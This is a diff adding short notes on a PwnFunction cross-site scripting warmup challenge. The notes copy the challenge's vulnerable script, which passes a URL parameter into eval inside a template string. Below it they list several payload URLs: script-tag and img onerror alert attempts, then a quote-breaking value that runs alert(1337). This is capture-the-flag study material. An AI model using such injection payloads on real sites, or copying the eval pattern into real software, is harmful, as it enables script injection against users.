@@ -1,0 +1,19 @@
+Jeff
+
+<!-- Challenge -->
+<h2 id="maname"></h2>
+<script>
+    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
+    let ma = ""
+    eval(`ma = "Ma name ${jeff}"`)
+    setTimeout(_ => {
+        maname.innerText = ma
+    }, 1000)
+</script>
+
+
+https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=<script>alert(123)</script>
+https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=<img src='x' onerror='alert(123)'>
+https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=<img src='x' onerror="-alert(123)-">
+
+https://sandbox.pwnfunction.com/warmups/jefff.html?jeff="-alert(1337)-"
